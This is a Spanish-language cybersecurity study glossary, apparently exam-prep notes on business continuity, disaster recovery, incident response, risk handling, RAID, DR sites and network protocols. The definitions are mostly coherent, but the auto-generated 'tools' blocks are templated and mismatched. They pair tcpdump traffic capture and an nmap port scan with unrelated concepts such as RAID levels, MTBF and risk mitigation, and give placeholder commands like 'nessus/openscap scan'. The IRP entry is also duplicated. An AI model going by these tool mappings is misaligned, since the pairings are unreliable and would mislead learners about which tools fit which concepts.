#### 🔧 Herramientas (Extension: auto-generated)

**Event Viewer:**  
- Propósito: Análisis de autenticación  
- Comando: `Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624,4625}`  
- Output: Eventos de logon  

**grep:**  
- Propósito: Búsqueda en auth logs Linux  
- Comando: `grep 'Failed password' /var/log/auth.log`  
- Output: Intentos fallidos  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4624 (success), 4625 (failure), 4648 (explicit credentials)
- Linux: /var/log/auth.log, /var/log/secure
- RADIUS/TACACS+ logs

---

### IRP (Incident Response Plan)

**Definición:** Plan documentado de respuesta a incidentes. Describe pasos en cada fase. Roles, responsabilidades, procedimientos. Playbooks

**Ejemplos:**
- Ransomware playbook
- Data breach response plan
- Contact escalation list
- IR phases documented

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

## Dominio 5 Gestion Programa Seguridad

**Peso examen:** 20%  **Términos ALTA prioridad:** 32  

### BCP (Business Continuity Plan)

**Definición:** Plan para mantener operaciones criticas durante/despues de desastre. Estrategias de continuidad de negocio

**Ejemplos:**
- Procedimientos de failover a sitio secundario
- Funciones criticas del negocio priorizadas
- Testing anual de BCP

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### DRP (Disaster Recovery Plan)

**Definición:** Plan para recuperar sistemas IT despues de desastre. Subset de BCP enfocado en tecnologia. RTO/RPO objectives

**Ejemplos:**
- Procedimientos de restore desde backup
- RTO: 4 horas, RPO: 1 hora
- Hot/Warm/Cold sites
- Testing de DR

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### IRP (Incident Response Plan)

**Definición:** Plan documentado para responder a incidentes de seguridad. Define roles, procedimientos, comunicacion, escalacion

**Ejemplos:**
- NIST 800-61: Preparation, Detection, Analysis, Containment, Eradication, Recovery, Post-Incident
- Playbooks por tipo de incidente
- CSIRT/SOC procedures

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Fases de Respuesta a Incidentes

**Definición:** Preparacion → Deteccion/Analisis → Contencion → Erradicacion → Recuperacion → Lecciones Aprendidas (NIST 800-61)

**Ejemplos:**
- Preparation: entrenar equipo, herramientas
- Detection: SIEM alerta
- Containment: aislar host
- Eradication: eliminar malware
- Recovery: restaurar servicios
- Lessons Learned: post-mortem

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### NTP (Network Time Protocol)

**Definición:** Protocolo sincronizacion de relojes en red. UDP puerto 123. Critico para logs, Kerberos, certificados

**Ejemplos:**
- time.nist.gov
- Puerto UDP 123
- Stratum levels
- Kerberos require NTP
- NTP amplification attack posible

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con NTP (Network Time Protocol)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### ICMP (Internet Control Message Protocol)

**Definición:** Protocolo mensajes de error y control IP. Ping, traceroute. Usado para diagnostico red. Puede ser abusado

**Ejemplos:**
- Ping (echo request/reply)
- Traceroute
- Destination unreachable
- ICMP flood DDoS
- Firewalls bloquean ICMP

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con ICMP (Internet Control Message Protocol)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### BYOD (Bring Your Own Device)

**Definición:** Modelo donde empleados usan dispositivos personales para trabajo. Riesgos seguridad. Require MDM, policies

**Ejemplos:**
- iPhone personal para email empresa
- MDM enrollment
- BYOD policy
- Security risks
- Work/personal data mixing

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### UEM (Unified Endpoint Management)

**Definición:** Gestion unificada de todos endpoints. Moviles, PCs, tablets, IoT, wearables. Evolucion de MDM + EMM

**Ejemplos:**
- VMware Workspace ONE
- Microsoft Intune UEM
- Gestiona mobiles + PCs + IoT
- Consola unica management

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Risk Exception

**Definición:** Aprobacion formal para NO remediar riesgo identificado. Decision de negocio. Acepta riesgo temporalmente con justificacion. Requiere autorizacion senior

**Ejemplos:**
- Sistema legacy critico no parcheable
- Costo de remediacion > impacto
- Necesita aprobacion CISO
- Revision periodica

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Risk Mitigation

**Definición:** Reducir probabilidad o impacto de riesgo. Implementar controles de seguridad. Estrategia mas comun. No elimina riesgo completamente

**Ejemplos:**
- Instalar firewall
- Aplicar parches
- Implementar MFA
- Training usuarios
- Reduce riesgo a nivel aceptable

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con Risk Mitigation  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### MTTR (Mean Time To Repair)

**Definición:** Tiempo promedio para reparar sistema tras fallo. Metrica de disponibilidad. Incluye deteccion + resolucion. Menor MTTR = mejor

**Ejemplos:**
- MTTR 2 horas
- Calcular: suma tiempos reparacion / numero incidentes
- Objetivo: reducir MTTR
- KPI de IT ops

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### MTBF (Mean Time Between Failures)

**Definición:** Tiempo promedio entre fallos de sistema. Metrica de fiabilidad. Mayor MTBF = mas confiable. Predice disponibilidad

**Ejemplos:**
- Disco duro MTBF 1 millon horas
- MTBF servidor 10000 horas
- Calcular disponibilidad: MTBF/(MTBF+MTTR)

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con MTBF (Mean Time Between Failures)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### RPO (Recovery Point Objective)

**Definición:** Maxima perdida de datos aceptable. Medido en tiempo. Frecuencia minima de backups. RPO 1 hora = backup cada hora

**Ejemplos:**
- RPO 4 horas
- RPO 0 (sin perdida datos) requiere replica sincrona
- Define frecuencia backup

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### RTO (Recovery Time Objective)

**Definición:** Tiempo maximo aceptable para restaurar servicio. Downtime maximo tolerable. Define urgencia de recuperacion. Menor RTO = mayor costo

**Ejemplos:**
- RTO 2 horas
- RTO critico: minutos (hot site)
- RTO 48h (cold site)
- Define tipo de sitio DR

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Risk Transference

**Definición:** Transferir riesgo a tercero. Tipicamente via seguro o contrato. Compartir impacto financiero. No elimina riesgo tecnico

**Ejemplos:**
- Seguro cibernetico
- Outsourcing a MSP
- Cloud provider SLA
- Clausulas contractuales

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### SLA (Service Level Agreement)

**Definición:** Acuerdo formal de nivel de servicio. Define expectativas y metricas. Uptime, tiempo de respuesta. Penalizaciones por incumplimiento

**Ejemplos:**
- 99.9% uptime
- Respuesta en 4 horas
- SLA AWS
- Creditos por downtime
- Medicion mensual

#### 🔧 Herramientas (Extension: auto-generated)

**Compliance scanner:**  
- Propósito: Verificar cumplimiento de SLA (Service Level Agreement)  
- Comando: `nessus/openscap scan`  
- Output: Reporte de compliance  

**Audit logs:**  
- Propósito: Evidencia para auditorías  
- Comando: `Export logs para auditor`  
- Output: Logs estructurados  

#### 📊 Log Analysis

**Logs a revisar:**
- Audit logs: cambios en configuración de seguridad
- Access logs: quién accedió a datos sensibles
- Change management logs: tickets y aprobaciones

---

### Tabletop Exercise

**Definición:** Ejercicio de simulacion de incidente basado en discusion. Participantes discuten respuesta a escenario. Sin ejecucion tecnica. Training de IR

**Ejemplos:**
- Simular ransomware attack
- Equipo discute pasos de respuesta
- Identificar gaps en plan IR
- No afecta produccion

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Root Cause Analysis

**Definición:** Analisis de causa raiz. Investigacion profunda de incidente. Identifica causa fundamental (no sintomas). Previene recurrencia

**Ejemplos:**
- 5 Whys technique
- Fishbone diagram
- Post-incident RCA
- Sintoma: outage. Causa raiz: falta patch management

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Chain of Custody

**Definición:** Cadena de custodia de evidencia digital. Documentacion de quien manejo evidencia y cuando. Preserva integridad legal. Forense

**Ejemplos:**
- Formulario de custodia
- Hash MD5/SHA de evidencia
- Log de acceso a evidencia
- Admisibilidad en corte

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### RAID 0

**Definición:** Disk Striping sin redundancia. Datos distribuidos en multiples discos. Mayor rendimiento. SIN tolerancia a fallos. Fallo de 1 disco = perdida total

**Ejemplos:**
- Minimo 2 discos
- Rendimiento maximo
- NO backup
- Capacidad total = suma discos
- NO recomendado para datos criticos

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con RAID 0  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### RAID 5

**Definición:** Disk Striping con paridad distribuida. Tolera fallo de 1 disco. Buen balance rendimiento/redundancia. Minimo 3 discos

**Ejemplos:**
- Minimo 3 discos
- Tolerancia 1 fallo
- Capacidad = (N-1) discos
- Calculo paridad XOR
- Popular en servidores

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con RAID 5  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### RAID 10

**Definición:** RAID 1+0. Combinacion de mirroring y striping. Mirrors primero, luego stripes. Alta redundancia y rendimiento. Minimo 4 discos

**Ejemplos:**
- Minimo 4 discos
- Tolera multiples fallos (1 por mirror)
- Capacidad = 50%
- Alto costo
- Alto rendimiento + alta disponibilidad

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con RAID 10  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### Hot Site

**Definición:** Sitio DR completamente equipado y operacional. Replica exacta de produccion. RTO minimo (minutos/horas). Costo mas alto

**Ejemplos:**
- Failover automatico
- Datos sincronizados tiempo real
- RTO < 1 hora
- Personal en standby
- Mayor costo DR

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Warm Site

**Definición:** Sitio DR parcialmente equipado. Infraestructura basica disponible. Requiere configuracion y datos. RTO medio (horas/dias). Costo moderado

**Ejemplos:**
- Servidores instalados pero no configurados
- RTO 12-24 horas
- Restore backup necesario
- Balance costo/tiempo

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Cold Site

**Definición:** Sitio DR solo con espacio fisico y servicios basicos. Sin equipos preinstalados. RTO largo (dias/semanas). Menor costo

**Ejemplos:**
- Solo edificio con electricidad y conectividad
- RTO > 1 semana
- Requiere envio e instalacion equipos
- Opcion mas economica

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Snapshot

**Definición:** Imagen punto-en-tiempo de sistema/datos. Captura estado instantaneo. Restauracion rapida. NO reemplaza backup completo

**Ejemplos:**
- VMware snapshot antes de cambio
- LVM snapshot
- Rollback rapido
- Storage snapshot
- NO es backup a largo plazo

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Replication

**Definición:** Copia continua de datos a ubicacion secundaria. Sincrona o asincrona. Alta disponibilidad. Parte de estrategia DR

**Ejemplos:**
- Replicacion sincrona (RPO=0)
- Replicacion asincrona (RPO>0)
- Database replication
- Storage replication

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Risk Register (Registro de Riesgos)

**Definición:** Documento que identifica, evalua y rastrea riesgos. Lista completa de riesgos con: descripcion, probabilidad, impacto, mitigacion

**Ejemplos:**
- Riesgo 1: Ransomware - Alta prob, Alto impacto - Mitigacion: Backups
- Risk ID, Owner, Status
- Living document

#### 🔧 Herramientas (Extension: auto-generated)

**Compliance scanner:**  
- Propósito: Verificar cumplimiento de Risk Register (Registro de Riesgos)  
- Comando: `nessus/openscap scan`  
- Output: Reporte de compliance  

**Audit logs:**  
- Propósito: Evidencia para auditorías  
- Comando: `Export logs para auditor`  
- Output: Logs estructurados  

#### 📊 Log Analysis

**Logs a revisar:**
- Audit logs: cambios en configuración de seguridad
- Access logs: quién accedió a datos sensibles
- Change management logs: tickets y aprobaciones

---

### PCI DSS (Payment Card Industry Data Security Standard)

**Definición:** Estandar de seguridad para industria de pagos. Protege datos de tarjetas. 12 requisitos. Obligatorio para procesadores de tarjetas

**Ejemplos:**
- Cifrar datos cardholder
- Firewall entre Internet y cardholder data
- No almacenar CVV
- Auditorias anuales

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### ISO (International Organization for Standardization)

**Definición:** Organizacion internacional de estandarizacion. Desarrolla estandares globales. ISO 27001 (seguridad info), ISO 9001 (calidad)

**Ejemplos:**
- ISO 27001 (ISMS)
- ISO 27002 (Security controls)
- ISO 9001 (Quality)
- ISO 22301 (Business continuity)

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### CSP (Cloud Service Provider)

**Definición:** Proveedor servicios cloud. Ofrece IaaS, PaaS, SaaS via Internet. AWS, Azure, GCP

**Ejemplos:**
- AWS
- Microsoft Azure
- Google Cloud
- IaaS/PaaS/SaaS
- Shared responsibility model

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### SNMP (Simple Network Management Protocol)

**Definición:** Protocolo gestion y monitoreo dispositivos de red. Colecta metricas. UDP 161/162. SNMPv3 seguro

**Ejemplos:**
- Monitor routers/switches
- MIB (Management Information Base)
- SNMPv3 authentication
- Puerto UDP 161
- SNMP traps

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con SNMP (Simple Network Management Protocol)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

